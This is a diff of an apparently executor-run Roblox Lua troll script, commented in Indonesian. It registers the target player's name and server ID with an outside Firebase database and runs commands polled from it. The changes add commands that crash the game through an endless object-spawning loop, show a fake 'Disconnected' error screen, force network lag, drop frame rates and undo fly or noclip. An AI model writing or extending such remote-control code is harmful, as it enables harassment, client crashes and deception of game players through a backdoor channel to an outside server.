@@ -3,20 +3,21 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local RunService = game:GetService("RunService")
 
--- === FIREBASE URL ===
 local FIREBASE_URL = "https://troll-master67-default-rtdb.firebaseio.com/"
 local MY_ROLE = "Target" 
 
 local lastCommandId = ""
 local orbitConnection
 local spasmConnection
+local lagConnection
 
 local function stopLoops()
     if orbitConnection then orbitConnection:Disconnect(); orbitConnection = nil end
     if spasmConnection then spasmConnection:Disconnect(); spasmConnection = nil end
+    if lagConnection then lagConnection:Disconnect(); lagConnection = nil end
+    settings().Network.IncomingReplicationLag = 0 -- Reset lag ke normal
 end
 
--- 1. FUNGSI AUTO LISTER
 local function registerPlayer()
     local playerData = {
         name = LocalPlayer.Name,
@@ -24,7 +25,6 @@ local function registerPlayer()
         gameId = tostring(game.JobId),
         placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
     }
-    
     local request = (syn and syn.request) or (http and http.request) or http_request or request
     if request then
         pcall(function()
@@ -38,20 +38,15 @@ local function registerPlayer()
     end
 end
 
--- Hapus data dari Firebase saat keluar game
 Players.PlayerRemoving:Connect(function(player)
     if player == LocalPlayer then
         local request = (syn and syn.request) or (http and http.request) or http_request or request
         if request then
-            request({
-                Url = FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json",
-                Method = "DELETE"
-            })
+            request({Url = FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json", Method = "DELETE"})
         end
     end
 end)
 
--- 2. LOGIKA MENERIMA PERINTAH
 local function executeCommand(cmdData)
     if not cmdData or cmdData.id == lastCommandId then return end
     lastCommandId = cmdData.id
@@ -68,21 +63,83 @@ local function executeCommand(cmdData)
     
     stopLoops()
     
+    -- === PERINTAH BARU & PERBAIKAN IY ===
+    
     if command == "reset" then
         if hum then hum.Health = 0 end
+        
     elseif command == "exit" then
-        while true do end 
+        game:Shutdown() -- Menutup game secara bersih jika didukung executor
+        
+    elseif command == "crash" then
+        -- Memaksa memory leak / pembekuan total thread agar game Roblox langsung crash/keluar mendadak
+        while true do
+            local _ = Instance.new("Part", workspace)
+        end
+        
+    elseif command == "fakedisconnect" then
+        -- Memunculkan UI disconnect tiruan bawaan Roblox
+        local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+        gui.IgnoreGuiInset = true
+        local bg = Instance.new("Frame", gui)
+        bg.Size = UDim2.new(1, 0, 1, 0)
+        bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        bg.BackgroundTransparency = 0.4
+        
+        local p = Instance.new("Frame", bg)
+        p.Size = UDim2.new(0, 380, 0, 220)
+        p.Position = UDim2.new(0.5, -190, 0.5, -110)
+        p.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+        
+        local t = Instance.new("TextLabel", p)
+        t.Size = UDim2.new(1, 0, 0, 40)
+        t.Text = "Disconnected"
+        t.TextColor3 = Color3.fromRGB(255, 255, 255)
+        t.TextSize = 22
+        t.Font = Enum.Font.SourceSansBold
+        t.BackgroundTransparency = 1
+        
+        local r = Instance.new("TextLabel", p)
+        r.Size = UDim2.new(1, -40, 0, 100)
+        r.Position = UDim2.new(0, 20, 0, 50)
+        r.Text = "Please check your internet connection and try again.\n(Error Code: 277)"
+        r.TextColor3 = Color3.fromRGB(200, 200, 200)
+        r.TextSize = 16
+        r.TextWrapped = true
+        r.Font = Enum.Font.SourceSans
+        r.BackgroundTransparency = 1
+        
+    elseif command == "replag" then
+        -- Menunda pertukaran data jaringan agar mereka terlihat patah-patah/lag parah di server
+        settings().Network.IncomingReplicationLag = 10 -- Menunda masuknya data selama 10 detik
+        
+    elseif command == "fpsdrop" then
+        -- Menurunkan performa FPS secara drastis menggunakan kalkulasi berat di setiap frame matematika
+        lagConnection = RunService.Heartbeat:Connect(function()
+            for i = 1, 3000000 do
+                local _ = math.sin(i) * math.cos(i)
+            end
+        end)
+        
+    elseif command == "antiy" then
+        -- Menghentikan paksa Fly, Noclip milik Infinite Yield dengan merestrukturisasi state objek karakter
+        if hum and root then
+            hum.PlatformStand = false
+            for _, part in ipairs(char:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = true -- Mematikan Noclip (Karakter kembali menabrak objek)
+                end
+            end
+            -- Memaksa kecepatan berjalan kembali lambat/normal jika mereka mengubah flyspeed/walkspeed
+            hum.WalkSpeed = 16 
+            local bv = root:FindFirstChildOfClass("BodyVelocity") or root:FindFirstChildOfClass("BodyGyro")
+            if bv then bv:Destroy() end -- Menghancurkan pendorong posisi terbang IY
+        end
+        
     elseif command == "freeze" then
         if root then root.Anchored = true end
     elseif command == "unfreeze" then
         if root then root.Anchored = false end
-        if hum then hum.WalkSpeed = 16 end
-    elseif command == "tppos" then
-        if root and extra then
-            local coords = {}
-            for coord in string.gmatch(extra, "[^,]+") do table.insert(coords, tonumber(coord)) end
-            if #coords >= 3 then root.CFrame = CFrame.new(coords[1], coords[2], coords[3]) end
-        end
     elseif command == "spasm" then
         if hum and root then
             hum.PlatformStand = true
@@ -110,7 +167,6 @@ local function executeCommand(cmdData)
     end
 end
 
--- Jalankan registrasi dan loop pengecekan
 registerPlayer()
 task.spawn(function()
     while true do
